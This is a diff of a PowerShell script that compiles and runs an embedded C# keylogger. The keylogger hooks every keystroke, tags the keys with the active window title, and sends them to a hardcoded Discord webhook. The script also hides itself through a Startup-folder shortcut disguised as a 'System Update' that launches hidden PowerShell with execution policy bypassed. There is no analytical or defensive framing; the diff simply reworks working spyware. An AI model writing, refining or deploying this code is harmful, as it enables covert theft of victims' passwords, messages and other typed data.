@@ -1,12 +1,6 @@
-# First, save the embedded keylogger C# script to a file
-$scriptDir = "$env:APPDATA\SystemUpdate"
-if (-not (Test-Path $scriptDir)) { New-Item -ItemType Directory -Path $scriptDir | Out-Null }
-$scriptPath = Join-Path $scriptDir 'system_update.ps1'
-
-$discordWebhookUrl = 'https://discordapp.com/api/webhooks/1408110244558799019/nU-r_w_V3FtUCzX7cv08lV4MhVojEPR0cQ5XsP7dI-HuEDNRvr3gZOOwcRyZnjcmilgO'
-
-$keyloggerCode = @"
+# Load required assemblies so the C# compiler knows about these namespaces
 Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Net.Http
 
 Add-Type -TypeDefinition @"
 using System;
@@ -23,21 +17,17 @@ namespace KeyLogger {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
 
-        private static StreamWriter logFile;
         private static HookProc hookProc = HookCallback;
         private static IntPtr hookId = IntPtr.Zero;
 
         private static string currentContextKey = """";
 
-        private static StringBuilder buffer = new StringBuilder();
         private static readonly object bufferLock = new object();
 
-        // Discord webhook URL
-        private static string discordWebhookUrl = """ + $discordWebhookUrl + @""";
+        private static string discordWebhookUrl = ""https://discordapp.com/api/webhooks/1408110244558799019/nU-r_w_V3FtUCzX7cv08lV4MhVojEPR0cQ5XsP7dI-HuEDNRvr3gZOOwcRyZnjcmilgO"";
 
         [STAThread]
         public static void Main() {
-            // logFile is no longer used to save locally
             hookId = SetHook(hookProc);
             Application.Run();
             UnhookWindowsHookEx(hookId);
@@ -53,14 +43,14 @@ namespace KeyLogger {
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                 int vkCode = Marshal.ReadInt32(lParam);
-                
+
                 WindowInfo windowInfo = GetActiveWindowInfo();
                 string newContextKey = windowInfo.Title + "::" + windowInfo.ClassName;
 
                 lock(bufferLock) {
                     if (newContextKey != currentContextKey) {
                         currentContextKey = newContextKey;
-                        SendToDiscord($""----- {EscapeForDiscord(currentContextKey)} -----\n"");
+                        SendToDiscord(""----- "" + EscapeForDiscord(currentContextKey) + "" -----\n"");
                     }
 
                     string keyString = ConvertKeyToString(vkCode);
@@ -70,18 +60,6 @@ namespace KeyLogger {
                 }
             }
             return CallNextHookEx(hookId, nCode, wParam, lParam);
-        }
-
-        private static string EscapeForDiscord(string text) {
-            if (string.IsNullOrEmpty(text)) return """";
-            // Escape characters that may break discord markdown or json
-            text = Regex.Replace(text, @"<", @"\<");
-            text = text.Replace(""`"", ""`"");
-            text = text.Replace(""*"", @"\*"");
-            text = text.Replace(""_"", @"\_"");
-            text = text.Replace(""~"", @"\~");
-            text = text.Replace(@"""", "\""");
-            return text;
         }
 
         private static void SendToDiscord(string message) {
@@ -99,11 +77,22 @@ namespace KeyLogger {
                 }
 
                 using (var response = (HttpWebResponse)request.GetResponse()) {
-                    // Optional: do something with response if needed
+                    // Response handling optional
                 }
             } catch {
-                // Ignore errors to avoid interrupting keylogging
+                // Silence any errors
             }
+        }
+
+        private static string EscapeForDiscord(string text) {
+            if (string.IsNullOrEmpty(text)) return """";
+            text = Regex.Replace(text, @"<", @"\<");
+            text = text.Replace(""`"", ""`"");
+            text = text.Replace(""*"", @"\*"");
+            text = text.Replace(""_"", @"\_"");
+            text = text.Replace(""~"", @"\~");
+            text = text.Replace(@"""", "\""");
+            return text;
         }
 
         private struct WindowInfo {
@@ -218,24 +207,23 @@ namespace KeyLogger {
         private static extern short GetKeyState(int nVirtKey);
     }
 }
-"@ -ReferencedAssemblies System.Windows.Forms
+"@ -ReferencedAssemblies @("System.Windows.Forms.dll","System.Net.Http.dll")
 
 [KeyLogger.Program]::Main()
-"@
 
-Set-Content -Path $scriptPath -Value $keyloggerCode -Encoding UTF8 -Force
+# After running this script manually once, you can create a startup shortcut manually like this:
 
-# Create startup shortcut
-$startupPath = [Environment]::GetFolderPath('Startup')
-$shortcutPath = Join-Path $startupPath 'SystemUpdate.lnk'
+$scriptPath = $MyInvocation.MyCommand.Path
+$startupFolder = [Environment]::GetFolderPath("Startup")
+$shortcutPath = Join-Path $startupFolder "SystemUpdate.lnk"
 
 $shell = New-Object -ComObject WScript.Shell
 $shortcut = $shell.CreateShortcut($shortcutPath)
+
 $shortcut.TargetPath = "powershell.exe"
 $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-$shortcut.WorkingDirectory = $scriptDir
+$shortcut.WorkingDirectory = Split-Path $scriptPath
 $shortcut.Description = "System Update Keylogger"
 $shortcut.Save()
 
-Write-Output "Keylogger script saved to $scriptPath"
 Write-Output "Startup shortcut created at $shortcutPath"
